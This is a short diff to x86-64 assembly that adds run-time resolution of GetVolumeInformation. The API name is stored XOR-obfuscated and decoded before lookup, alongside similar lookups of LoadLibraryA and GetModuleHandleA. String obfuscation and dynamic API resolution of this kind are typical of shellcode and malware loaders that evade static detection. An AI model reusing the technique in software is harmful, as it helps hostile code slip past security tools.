@@ -1024,6 +1024,14 @@ populate_kernel_function_ptrs_by_name:
     mov [load_library_a], rax                   ; LoadLibraryA addr
 
     mov rcx, [rbp + 16]
+    mov rdx, get_volume_information_a_xor
+    mov r8, get_volume_information_a_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_volume_information_a], rax         ; GetVolumeInformation addr
+
+    mov rcx, [rbp + 16]
     mov rdx, get_module_handle_a_xor
     mov r8, get_module_handle_a_xor.len
     xor r9, r9
